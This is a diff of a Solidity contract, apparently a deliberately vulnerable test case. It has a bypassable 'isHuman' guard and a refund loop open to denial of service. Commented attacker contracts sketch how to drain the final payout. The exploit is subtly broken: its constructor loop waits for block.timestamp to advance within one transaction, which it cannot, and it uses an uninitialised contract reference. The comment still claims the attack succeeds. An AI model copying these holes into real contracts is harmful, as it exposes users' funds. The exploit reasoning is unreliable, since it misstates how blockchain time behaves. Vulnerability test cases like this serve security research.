@@ -2,10 +2,13 @@ pragma solidity ^0.8.0;
 
 // SPDX-License-Identifier: GPL-3.0
 contract C {
-    mapping (address => uint256) private balances;
+    address[] private buyers;
 
+    uint public currentKeyPrice = 1;
+    address private lastBuyer;
+    uint private lastBuyTimestamp;
 
-    // this implementation is unsafe as it allows calls from costructor bodies
+    // this modifier checks that caller is an EOA, though it can be bypassed by a contract constructor
     modifier isHuman() {
         address _addr = msg.sender;
         uint256 _codeLength;
@@ -14,45 +17,47 @@ contract C {
         _;
     }
 
-    function transfer(address from, address to) isHuman() public {
-        uint256 amt = balances[from];
-        require(amt > 0, "Insufficient funds");
-        (bool success, ) = to.call{value:amt}("");
-        require(success, "Call failed");
-        balances[from] = 0;    // side effect after call
+    function buyKey(address refund_address) isHuman() public payable {
+        require(msg.value > currentKeyPrice, "Not enough to buy a key");
+        lastBuyer = msg.sender;
+        lastBuyTimestamp = block.timestamp;
+        currentKeyPrice = buyers.length * 100;
+        buyers.push(refund_address);
+
+        for (uint i = 0; i < buyers.length; i++) {
+            (bool success, ) = buyers[i].call{value:1}("");
+            require(success, "Refund failed");
+        }
     }
 
-    function deposit() public payable isHuman() {
-        balances[msg.sender] += msg.value;       
+    function close() isHuman public {
+        require(block.timestamp > lastBuyTimestamp + 1 hours);
+        (bool success, ) = lastBuyer.call{value: currentKeyPrice * 2}("");
+        require(success, "Call failed");
     }
 }
 
-// an attacker performs from off-chain:
-//    deposit{value: 100}();
-//    transfer(SELF, attacker);   // where SELF is the EOA of the attacker and attacker is an instance of the Attacker contract
+// off chain
+// Attacker att = new Attacker();
+// c.buyKey{value: c.currentKeyPrice() + 1}(address(att));
+
 // contract Attacker {
+//     C c;
 
-//     address attacker_eoa;
-//     uint256 public counter = 2;
-
-//     constructor() {
-//         attacker_eoa = msg.sender;
-//     }
-    
 //     receive() payable external {
-//         // now this contract has received the amount (100)
-//         // and a new contract is instantiated, passing addresses for reentering
-//         if (counter > 0) {
-//             counter--;
-//             new Aux(attacker_eoa, address(this), msg.sender);
-//         }
+//         new Aux();
 //     }
 // }
 
 // contract Aux {
-//     constructor(address attacker_eoa, address attacker, address victim) {
-//         // within this constructor a reentrancy is performed and more ether (100) is transfered to the Attacker contract again
-//         // the isHuman guard succeedes because we are INSIDE a constructor
-//         C(victim).transfer(attacker_eoa, attacker);
+//     C c;
+
+//     constructor() {
+//         uint t = block.timestamp;
+//         while (block.timestamp - t < 1 hours) {
+//             (bool success, ) = address(c).call(abi.encodeWithSignature("close()"));
+//             // this fails for 1 hour, but the txn is not reverted since we ignore the success flag
+//         }
+//         c.close();  // this will succeed as 1 hour has passed
 //     }
 // }
